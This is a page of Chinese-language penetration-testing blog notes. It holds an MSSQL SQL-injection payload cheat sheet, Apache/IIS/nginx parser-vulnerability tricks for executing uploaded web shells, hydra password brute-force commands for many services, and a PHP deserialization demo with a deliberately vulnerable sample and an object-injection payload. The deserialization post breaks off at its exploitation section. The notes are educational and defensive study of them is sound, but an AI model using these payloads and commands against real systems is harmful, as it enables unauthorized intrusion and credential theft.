<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="Leticia&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="Leticia&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Leticia&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/6/"/>





  <title> Leticia's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Leticia's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/MSSQL注入总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/03/MSSQL注入总结/" itemprop="url">
                  MSSQL注入总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:29:52+08:00">
                2018-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/03/MSSQL注入总结/" class="leancloud_visitors" data-flag-title="MSSQL注入总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前所有的sql注入类型的博客都以mysql数据库为例子的，但是在最近实际的渗透测试中有时会遇到一些MSSQL的数据库，所以对MSSQL注入进行一次总结。</p>
<h2 id="0x01-MSSQL"><a href="#0x01-MSSQL" class="headerlink" title="0x01 MSSQL"></a>0x01 MSSQL</h2><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。</p>
<h2 id="0x02-MSSQL手工注入技巧"><a href="#0x02-MSSQL手工注入技巧" class="headerlink" title="0x02 MSSQL手工注入技巧"></a>0x02 MSSQL手工注入技巧</h2><h4 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h4><ul>
<li>?id=1</li>
<li>?id=1’</li>
<li>?id=1 and 1=1</li>
<li>?id=1 and 1=2</li>
</ul>
<h4 id="2-判断是否是mssql"><a href="#2-判断是否是mssql" class="headerlink" title="2.判断是否是mssql"></a>2.判断是否是mssql</h4><ul>
<li>?id=1 and user&gt;0</li>
</ul>
<h4 id="3-判断数据库系统"><a href="#3-判断数据库系统" class="headerlink" title="3.判断数据库系统"></a>3.判断数据库系统</h4><ul>
<li>?id=1 and (select count(*) from sysobjects)&gt;0　　 mssql</li>
<li>?id=1 and (select count(*) from msysobjects)&gt;0　　access</li>
</ul>
<h4 id="4-查询当前用户数据信息"><a href="#4-查询当前用户数据信息" class="headerlink" title="4.查询当前用户数据信息"></a>4.查询当前用户数据信息</h4><ul>
<li>?id=1 having 1=1–</li>
</ul>
<h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5.猜表名"></a>5.猜表名</h4><ul>
<li>?id=1 and exists(select * from tablename)</li>
<li>?id=1 and (Select Count(*) from [表名])&gt;0</li>
</ul>
<h4 id="6-猜字段"><a href="#6-猜字段" class="headerlink" title="6.猜字段"></a>6.猜字段</h4><ul>
<li>?id=1 and (Select Count(字段名) from 表名)&gt;0</li>
</ul>
<h4 id="7-暴当前表中的列"><a href="#7-暴当前表中的列" class="headerlink" title="7.暴当前表中的列"></a>7.暴当前表中的列</h4><ul>
<li>?id=1 group by admin.username having 1=1–</li>
</ul>
<h4 id="8-猜字段中记录长度"><a href="#8-猜字段中记录长度" class="headerlink" title="8.猜字段中记录长度"></a>8.猜字段中记录长度</h4><ul>
<li>?id=1 and (select top 1 len(字段名) from 表名)&gt;0</li>
</ul>
<h4 id="9-猜字段中的ascii值"><a href="#9-猜字段中的ascii值" class="headerlink" title="9.猜字段中的ascii值"></a>9.猜字段中的ascii值</h4><ul>
<li>?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   access</li>
<li>?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0   mssql</li>
</ul>
<h4 id="10-测试权限结构（mssql）"><a href="#10-测试权限结构（mssql）" class="headerlink" title="10.测试权限结构（mssql）"></a>10.测试权限结构（mssql）</h4><ul>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–</li>
</ul>
<h4 id="11-mssql内置函数"><a href="#11-mssql内置函数" class="headerlink" title="11.mssql内置函数"></a>11.mssql内置函数</h4><ul>
<li>?id=1 and (select @@version)&gt;0　　　获得Windows的版本号</li>
<li>?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa</li>
<li>?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户</li>
<li>?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/01/解析漏洞总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/01/解析漏洞总结/" itemprop="url">
                  解析漏洞总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-01T21:47:29+08:00">
                2018-05-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/01/解析漏洞总结/" class="leancloud_visitors" data-flag-title="解析漏洞总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-服务器解析漏洞"><a href="#0x00-服务器解析漏洞" class="headerlink" title="0x00 服务器解析漏洞"></a>0x00 服务器解析漏洞</h2><p>服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。</p>
<p>我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。</p>
<h2 id="0x01-apache"><a href="#0x01-apache" class="headerlink" title="0x01 apache"></a>0x01 apache</h2><h4 id="一、不可识别解析"><a href="#一、不可识别解析" class="headerlink" title="一、不可识别解析"></a>一、不可识别解析</h4><p>apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<p>apache版本在以下范围内</p>
<ul>
<li>Apache 2.0.x &lt;= 2.0.59</li>
<li>Apache 2.2.x &lt;= 2.2.17</li>
<li>Apache 2.2.2 &lt;= 2.2.8</li>
</ul>
<p>都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。</p>
<h4 id="二、配置问题"><a href="#二、配置问题" class="headerlink" title="二、配置问题"></a>二、配置问题</h4><ul>
<li>1.如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li>
<li>2.如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</li>
</ul>
<h2 id="0x02-IIS"><a href="#0x02-IIS" class="headerlink" title="0x02 IIS"></a>0x02 IIS</h2><h4 id="一、目录解析"><a href="#一、目录解析" class="headerlink" title="一、目录解析"></a>一、目录解析</h4><p>在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。</p>
<h4 id="二、文件解析"><a href="#二、文件解析" class="headerlink" title="二、文件解析"></a>二、文件解析</h4><p>在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。</p>
<h4 id="三、其他解析类型"><a href="#三、其他解析类型" class="headerlink" title="三、其他解析类型"></a>三、其他解析类型</h4><p>在IIS6.0的版本，如下几种文件类型也会被执行。</p>
<ul>
<li>xxx.asa</li>
<li>xxx.cer</li>
<li>xxx.cdx</li>
</ul>
<h4 id="四、php-cgi漏洞"><a href="#四、php-cgi漏洞" class="headerlink" title="四、php-cgi漏洞"></a>四、php-cgi漏洞</h4><p>在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg/.php即可连接一句话木马。</p>
<h2 id="0x03-nginx"><a href="#0x03-nginx" class="headerlink" title="0x03 nginx"></a>0x03 nginx</h2><h4 id="一、低版本nginx"><a href="#一、低版本nginx" class="headerlink" title="一、低版本nginx"></a>一、低版本nginx</h4><p>nginx 0.5.x、nginx 0.6.x中可以通过在任意文件名后面增加%00.php解析为php</p>
<h4 id="二、php-cgi漏洞"><a href="#二、php-cgi漏洞" class="headerlink" title="二、php-cgi漏洞"></a>二、php-cgi漏洞</h4><p>和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg/.php解析成php</p>
<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
<li>1.对于php-cgi漏洞，可以修改php.ini文件，将cgi.fix_pathinfo的值设置为0</li>
<li>2.使用白名单匹配文件后缀名</li>
<li>3.可以对上传后的文件固定后缀之前的所有字符进行重命名</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/29/爆破工具hydra笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/29/爆破工具hydra笔记/" itemprop="url">
                  爆破工具hydra笔记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-29T21:17:42+08:00">
                2018-04-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/29/爆破工具hydra笔记/" class="leancloud_visitors" data-flag-title="爆破工具hydra笔记">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-hydra"><a href="#0x00-hydra" class="headerlink" title="0x00 hydra"></a>0x00 hydra</h2><p>hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等。</p>
<h2 id="0x01-参数说明"><a href="#0x01-参数说明" class="headerlink" title="0x01 参数说明"></a>0x01 参数说明</h2><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]<br>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p>
<ul>
<li>-R 继续从上一次进度接着破解。</li>
<li>-S 采用SSL链接。</li>
<li>-s PORT 可通过这个参数指定非默认端口。</li>
<li>-l LOGIN 指定破解的用户，对特定用户破解。</li>
<li>-L FILE 指定用户名字典。</li>
<li>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</li>
<li>-P FILE 大写，指定密码字典。</li>
<li>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</li>
<li>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</li>
<li>-M FILE 指定目标列表文件一行一条。</li>
<li>-o FILE 指定结果输出文件。</li>
<li>-f 在使用-f参数以后，找到第一对登录名或者密码的时候中止破解。</li>
<li>-t TASKS 同时运行的线程数，默认为16。</li>
<li>-w TIME 设置最大超时的时间，单位秒，默认是30s。</li>
<li>-v / -V 显示详细过程。</li>
<li>server 目标ip</li>
<li>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</li>
<li>OPT 可选项</li>
</ul>
<h2 id="0x02-使用范例"><a href="#0x02-使用范例" class="headerlink" title="0x02 使用范例"></a>0x02 使用范例</h2><ul>
<li>1.破解ssh：<br>hydra -l 用户名 -p 密码字典 -t 线程 ip ssh</li>
<li>2.破解ftp：<br>hydra ip ftp -l 用户名 -P 密码字典 -t 线程</li>
<li>3.破解web登录（get方式）：<br>hydra -l 用户名 -p 密码字典 -t 线程 -f ip http-get 127.0.0.1/admin/index.php</li>
<li>4.破解web登录（post方式）：<br>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login”</li>
<li>5.破解https：<br>hydra -m /index.php -l 用户名 -P 密码字典 ip https</li>
<li>6.破解teamspeak：<br>hydra -l 用户名 -P 密码字典 -s 端口号 ip teamspeak</li>
<li>7.破解cisco：<br>hydra -P 密码字典 ip cisco</li>
<li>8.破解smb：<br>hydra -l 用户名 -P 密码字典 ip smb</li>
<li>9.破解pop3：<br>hydra -l 用户名 -P 密码字典 my.pop3.mail pop3</li>
<li>10.破解rdp：<br>hydra ip rdp -l 用户名 -P 密码字典 -V</li>
<li>11.破解http-proxy：<br>hydra -l 用户名 -p 密码字典 -t 线程 http-proxy://xxx.xxx.xxx.xxx</li>
<li>12.破解imap：<br>hydra -l 用户名 -P 密码字典 ip imap PLAIN</li>
</ul>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>hydra支持多种协议的爆破，并且使用方式简单灵活，是暴力测试必备良器，只需要自行提供字典，或根据实际情况生成社工字典，就可以运用到绝大多数场景。</p>
<p>这里提供一下博主经常使用的一些字典 <a href="https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/29/反序列化漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/29/反序列化漏洞/" itemprop="url">
                  PHP反序列化漏洞
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-29T10:57:11+08:00">
                2018-04-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/29/反序列化漏洞/" class="leancloud_visitors" data-flag-title="PHP反序列化漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-序列化和反序列化"><a href="#0x00-序列化和反序列化" class="headerlink" title="0x00 序列化和反序列化"></a>0x00 序列化和反序列化</h2><p>PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。  </p>
<p>serialize可以将变量转换为字节流并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字节流变换回变量。</p>
<p>我们看一个序列化后再反序列化的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-Type: text/html; charset=gb2312&apos;);</span><br><span class="line">$arr=array();</span><br><span class="line">$arr[&apos;name&apos;]=&apos;名字&apos;;</span><br><span class="line">$arr[&apos;age&apos;]=&apos;21&apos;;</span><br><span class="line">$arr[&apos;sex&apos;]=&apos;男&apos;;</span><br><span class="line">$arr[&apos;phone&apos;]=&apos;12345678910&apos;;</span><br><span class="line">$arr[&apos;address&apos;]=&apos;上海&apos;;</span><br><span class="line">var_dump($arr);</span><br><span class="line">$info=serialize($arr);</span><br><span class="line">var_dump($info);</span><br><span class="line">$info_array=unserialize($info);</span><br><span class="line">var_dump($info_array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后输出结果：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize01.png" alt=""></p>
<h2 id="0x01-PHP反序列化漏洞"><a href="#0x01-PHP反序列化漏洞" class="headerlink" title="0x01 PHP反序列化漏洞"></a>0x01 PHP反序列化漏洞</h2><p>PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。<br>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。我们在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行，那么就可能引发对象注入漏洞。</p>
<h2 id="0x02-简单测试"><a href="#0x02-简单测试" class="headerlink" title="0x02 简单测试"></a>0x02 简单测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;test&apos;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>比如上述代码，构造payload为<a href="http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}" target="_blank" rel="noopener">http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}</a><br>这里O表示对象，1表示对象名长度，”A”是对象名，下来的1是对象中的字段名，后面花括号中的s代表string，4代表长度，”test”是内容；s代表string，5代表长度，”hello”是内容。</p>
<p>下面是一些数据类型的代表字母：</p>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
<p>反序列化后在脚本运行结束时就会调用_destruct函数，同时会覆盖test变量输出hello。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize02.png" alt=""></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>我们再尝试一种方式利用漏洞。</p>
